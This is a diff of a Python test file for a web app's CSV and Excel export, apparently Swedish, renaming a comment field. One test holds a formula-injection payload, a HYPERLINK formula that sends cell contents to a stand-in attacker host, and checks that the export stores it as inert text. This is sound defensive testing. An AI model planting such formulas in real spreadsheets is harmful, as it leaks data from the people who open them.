@@ -219,7 +219,7 @@ def test_json_export_utan_token(client, app_db):
 def test_csv_exporter(client, app_db):
     ids = seed_trad(app_db)
     medlem = skapa_medlem(app_db, "Uppsala universitet")
-    satt_svar(app_db, medlem, ids["wos"], "kan_vanta", workaround="Cron-skript.")
+    satt_svar(app_db, medlem, ids["wos"], "kan_vanta", oppen_kommentar="Cron-skript.")
     app_db.commit()
     logga_in(client, app_db)
 
@@ -238,19 +238,19 @@ def test_export_neutraliserar_formelinjektion(client, app_db):
     medlem = skapa_medlem(app_db, "Uppsala universitet")
     elak = '=HYPERLINK("http://angripare/?"&A1,"klicka")'
     satt_svar(app_db, medlem, ids["wos"], "kan_vanta",
-              workaround=elak, workaround_delas=1)
+              oppen_kommentar=elak, oppen_delning="anonym")
     app_db.commit()
     logga_in(client, app_db)
 
     bed = client.get("/export/bedomningar.csv").text
     rad = next(r for r in csv.DictReader(io.StringIO(bed))
                if r["medlem"] == "Uppsala universitet")
-    assert rad["workaround"] == "'" + elak       # apostrophe-prefixed, so inert
+    assert rad["oppen_kommentar"] == "'" + elak  # apostrophe-prefixed, so inert
 
     svar = client.get("/export/teaball.xlsx")
     wb = load_workbook(io.BytesIO(svar.content))
     rad = next(wb["Bedömningar"].iter_rows(min_row=2, values_only=True))
-    cell = rad[4]                                # Workaround column
+    cell = rad[4]                                # Öppen kommentar column
     assert cell == "'" + elak                    # stored as literal text, not a formula
 
 
